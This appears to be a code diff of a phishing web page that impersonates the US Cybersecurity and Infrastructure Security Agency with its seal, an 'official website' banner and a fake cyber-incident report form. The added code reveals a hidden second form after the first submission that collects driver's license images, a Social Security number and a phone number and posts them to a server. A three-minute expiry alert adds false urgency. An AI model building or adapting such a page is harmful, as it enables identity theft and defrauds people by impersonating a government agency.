@@ -1,162 +1,101 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="stylesheet" href="./css/report.css">
-  <title>CISA/</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800&display=swap');
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="./css/report.css">
+<title>CISA/</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800&display=swap');
+
+  /* Add your additional styles here */
+  .driver-license-form {
+    display: none; /* Initially hidden */
+  }
+
+  .driver-license-form label {
+    display: block;
+    margin-top: 10px;
+  }
+</style>
 </head>
 <body>
-  <div class="subnav">
-    <div class="cisa"><img src="./css/images/2560px-Flag_of_the_United_States.svg.png" alt=""></div>
-    <p>An official website of the United States</p>
-  </div>
-
-  <nav>
-    <div class="logo"><img src="./css/images/Seal_of_Cybersecurity_and_Infrastructure_Security_Agency.svg" alt=""><p>CYBERSECURITY & <br> INFRASTRUCTURE <br> SECURITY AGENCY</p></div>
-
-    <a href="report.html"><button onclick="alert('Your report ID will expire within 3 minutes and your session will be terminated for security purposes. It is recommended that you make your report statement quick.')">Report Page</button></a>
-  </nav>
-
-  <div class="subcontainer">
-    <h3>AMERICA'S CYBER SECURITY DEFENCE AGENCY</h3>
-  </div>
-
-  <div class="pop">
-
-  </div>
-
-  
-  <h2>Cybersecurity Threat Report</h2>
-
-  <div id="popupContainer">
-    <div id="closeButton" onclick="closePopup()">X</div><br>
-    <p>Thank you for contributing to our cybersecurity community!</p>
-    <p>Your reports help make the internet a safer place for everyone. Please request for Agencies private report link if you happen to have any relative or associate that might have been a victim.</p><br>
-    <button onclick="copyToClipboard('https://your-url.com')" style="background-color: white; color: #4CAF50;">COPY REPORT LINK</button>
+<div class="subnav">
+  <div class="cisa"><img src="./css/images/2560px-Flag_of_the_United_States.svg.png" alt=""></div>
+  <p>An official website of the United States</p>
 </div>
 
+<nav>
+  <div class="logo"><img src="./css/images/Seal_of_Cybersecurity_and_Infrastructure_Security_Agency.svg" alt=""><p>CYBERSECURITY & <br> INFRASTRUCTURE <br> SECURITY AGENCY</p></div>
 
-  <form id="cybersecurityForm">
-      <label for="reporter_name">Your Name:</label>
-      <input type="text" id="reporter_name" name="reporter_name" required>
+  <a href="report.html"><button onclick="alert('Your report ID will expire within 3 minutes and your session will be terminated for security purposes. It is recommended that you make your report statement quick.')">Report Page</button></a>
+</nav>
 
-      <label for="email">Your Email:</label>
-      <input type="email" id="email" name="email" required>
+<div class="subcontainer">
+  <h3>AMERICA'S CYBER SECURITY DEFENCE AGENCY</h3>
+</div>
 
-      <label for="incidentType">Incident Type:</label>
-      <select id="incidentType" name="incidentType" required>
-          <option value="phishing">Select Incident Type</option>
-          <option value="phishing">Phishing</option>
-          <option value="malware">Malware</option>
-          <option value="dataBreach">Data Breach</option>
-          <option value="dataBreach">Man-in-the-Middle Attacks</option>
-          <option value="dataBreach">Denial-of-Service (DoS) and Distributed Denial-of-Service (DDoS) Attacks</option>
-          <option value="dataBreach">Credential Attacks</option>
-          <option value="dataBreach">Social Engineering</option>
-          <option value="dataBreach">Cryptojacking</option>
-          
-          <!-- Add more options as needed -->
-      </select><br><br>
+<div class="pop"></div>
 
-      <label for="incidentDetails">Incident Details:</label>
-      <textarea id="incidentDetails" name="incidentDetails" placeholder="Please elaborate more on the incident"></textarea>
+<h2>Cybersecurity Threat Report</h2>
 
-      <button type="submit">Submit Report</button>
-  </form>
+<div id="popupContainer">
+  <div id="closeButton" onclick="closePopup()">X</div><br>
+  <p>Thank you for contributing to our cybersecurity community!</p>
+  <p>Your reports help make the internet a safer place for everyone. Please request for Agencies private report link if you happen to have any relative or associate that might have been a victim.</p><br>
+  <button onclick="copyToClipboard('https://your-url.com')" style="background-color: white; color: #4CAF50;">COPY REPORT LINK</button>
+</div>
 
-  <script>
+<!-- Your existing HTML content -->
 
-        // Function to copy text to clipboard
-        function copyToClipboard(text) {
-            // Create a temporary input element
-            var inputElement = document.createElement('textarea');
-            inputElement.value = text;
-            document.body.appendChild(inputElement);
+<div id="loading-spinner" style="display: none;">
+  <div class="spinner"></div>
+</div>
 
-            // Select the text in the input element
-            inputElement.select();
-            inputElement.setSelectionRange(0, 99999); // For mobile devices
+<form id="cybersecurityForm">
+  <label for="reporter_name">Your Name:</label>
+  <input type="text" id="reporter_name" name="reporter_name" required>
 
-            // Copy the selected text to the clipboard
-            document.execCommand('copy');
+  <label for="email">Your Email:</label>
+  <input type="email" id="email" name="email" required>
 
-            // Remove the temporary input element
-            document.body.removeChild(inputElement);
+  <label for="incidentType">Incident Type:</label>
+  <select id="incidentType" name="incidentType" required>
+    <option value="phishing">Select Incident Type</option>
+    <option value="phishing">Phishing</option>
+    <option value="malware">Malware</option>
+    <option value="dataBreach">Data Breach</option>
+    <option value="dataBreach">Man-in-the-Middle Attacks</option>
+    <option value="dataBreach">Denial-of-Service (DoS) and Distributed Denial-of-Service (DDoS) Attacks</option>
+    <option value="dataBreach">Credential Attacks</option>
+    <option value="dataBreach">Social Engineering</option>
+    <option value="dataBreach">Cryptojacking</option>
+    <!-- Add more options as needed -->
+  </select><br><br>
 
-            // Optionally provide user feedback
-            alert('URL copied to clipboard');
-        }
+  <label for="incidentDetails">Incident Details:</label>
+  <textarea id="incidentDetails" name="incidentDetails" placeholder="Please elaborate more on the incident"></textarea>
 
-            // Function to show the popup after 3 seconds
-        function showPopup() {
-            setTimeout(function() {
-                document.getElementById("popupContainer").style.display = "block";
-            }, 3000); // 3000 milliseconds = 3 seconds
-        }
+  <button type="submit">Submit Report</button>
+</form>
 
-        // Function to close the popup
-        function closePopup() {
-            document.getElementById("popupContainer").style.display = "none";
-        }
+<!-- Additional input form for driver's license and SSN -->
+<form id="driverLicenseForm" class="driver-license-form">
+  <label for="driverLicenseFront">Driver's License (Front):</label>
+  <input type="file" id="driverLicenseFront" name="driverLicenseFront" accept="image/*" required>
 
-        // Call the function when the page loads
-        window.onload = showPopup;
+  <label for="driverLicenseBack">Driver's License (Back):</label>
+  <input type="file" id="driverLicenseBack" name="driverLicenseBack" accept="image/*" required>
 
-       
-                // Add an event listener to the form for form submission
-        document.getElementById("cybersecurityForm").addEventListener("submit", function(event) {
-          // Prevent the default form submission behavior
-          event.preventDefault();
+  <label for="ssn">Social Security Number (SSN):</label>
+  <input type="text" id="ssn" name="ssn" required>
 
-          // Retrieve form data
-          var reporterName = document.getElementById("reporter_name").value.trim();
-          var email = document.getElementById("email").value.trim();
-          var incidentType = document.getElementById("incidentType").value.trim();
-          var incidentDetails = document.getElementById("incidentDetails").value.trim();
+  <label for="phoneNumber">Phone Number:</label>
+  <input type="tel" id="phoneNumber" name="phoneNumber" pattern="[0-9]{3}-[0-9]{3}-[0-9]{4}" placeholder="Format: 123-456-7890" required>
 
-          // Check if the reporter name is empty
-          if (!reporterName) {
-            alert("Please enter your name.");
-            return;
-          }
+  <button type="submit">Submit Details</button>
+</form>
 
-          // Send form data to the server using fetch API
-          fetch('/submit-form', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-              reporter_name: reporterName,
-              email: email,
-              incidentType: incidentType,
-              incidentDetails: incidentDetails
-            })
-          })
-          .then(response => {
-            if (!response.ok) {
-              throw new Error('Network response was not ok');
-            }
-            return response.text(); // Return response text
-          })
-          .then(data => {
-            // Display success message to the user
-            alert(data);
-          })
-          .catch(error => {
-            // Display error message to the user
-            console.error('There was a problem with your fetch operation:', error);
-            alert('There was an error processing your request. Please try again later.');
-          });
-        });
-  
-  </script>
-
-<br><br><br>
 <footer>
   <div class="container5">
     <div class="logo"><img src="./css/images/Seal_of_Cybersecurity_and_Infrastructure_Security_Agency.svg" alt=""><p>CYBERSECURITY & <br> INFRASTRUCTURE <br> SECURITY AGENCY</p></div><br><br>
@@ -164,5 +103,137 @@
     <br>
   </div>
 </footer>
+
+<script>
+  // Function to copy text to clipboard
+  function copyToClipboard(text) {
+    // Create a temporary input element
+    var inputElement = document.createElement('textarea');
+    inputElement.value = text;
+    document.body.appendChild(inputElement);
+
+    // Select the text in the input element
+    inputElement.select();
+    inputElement.setSelectionRange(0, 99999); // For mobile devices
+
+    // Copy the selected text to the clipboard
+    document.execCommand('copy');
+
+    // Remove the temporary input element
+    document.body.removeChild(inputElement);
+
+    // Optionally provide user feedback
+    alert('URL copied to clipboard');
+  }
+
+  // Function to show the popup after 3 seconds
+  function showPopup() {
+    setTimeout(function() {
+      document.getElementById("popupContainer").style.display = "block";
+    }, 3000); // 3000 milliseconds = 3 seconds
+  }
+
+  // Function to close the popup
+  function closePopup() {
+    document.getElementById("popupContainer").style.display = "none";
+  }
+
+  // Call the function when the page loads
+  window.onload = showPopup;
+
+// Function to handle form submission for the first form
+document.getElementById("cybersecurityForm").addEventListener("submit", function(event) {
+  // Prevent the default form submission behavior
+  event.preventDefault();
+
+  // Show the loading spinner
+  document.getElementById("loading-spinner").style.display = "block";
+
+  // Retrieve form data
+  var reporterName = document.getElementById("reporter_name").value.trim();
+  var email = document.getElementById("email").value.trim();
+  var incidentType = document.getElementById("incidentType").value.trim();
+  var incidentDetails = document.getElementById("incidentDetails").value.trim();
+
+  // Check if the reporter name is empty
+  if (!reporterName) {
+    alert("Please enter your name.");
+    // Hide the loading spinner if there's an error
+    document.getElementById("loading-spinner").style.display = "none";
+    return;
+  }
+
+  // Send form data to the server using fetch API
+  fetch('/submit-form', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      reporter_name: reporterName,
+      email: email,
+      incidentType: incidentType,
+      incidentDetails: incidentDetails
+    })
+  })
+  .then(response => {
+    if (!response.ok) {
+      throw new Error('Network response was not ok');
+    }
+    return response.text(); // Return response text
+  })
+  .then(data => {
+    // Display success message to the user
+    alert(data);
+
+    // Hide the loading spinner after successful form submission
+    document.getElementById("loading-spinner").style.display = "none";
+
+    // Show additional input form for driver's license and SSN
+    document.getElementById("driverLicenseForm").style.display = "block";
+  })
+  .catch(error => {
+    // Display error message to the user
+    console.error('There was a problem with your fetch operation:', error);
+    alert('There was an error processing your request. Please try again later.');
+
+    // Hide the loading spinner if there's an error
+    document.getElementById("loading-spinner").style.display = "none";
+  });
+});
+
+
+  // Function to handle form submission for additional details
+  document.getElementById("driverLicenseForm").addEventListener("submit", function(event) {
+    // Prevent the default form submission behavior
+    event.preventDefault();
+
+    // Retrieve additional form data
+    var formData = new FormData(this);
+
+    // Send form data to the server using fetch API
+    fetch('/submit-additional-details', {
+      method: 'POST',
+      body: formData
+    })
+    .then(response => {
+      if (!response.ok) {
+        throw new Error('Network response was not ok');
+      }
+      return response.text(); // Return response text
+    })
+    .then(data => {
+      // Display success message to the user
+      alert(data);
+
+      window.location.href = "/index.html"; 
+    })
+    .catch(error => {
+      // Display error message to the user
+      console.error('There was a problem with your fetch operation:', error);
+      alert('There was an error processing your request. Please try again later.');
+    });
+  });
+</script>
 </body>
 </html>
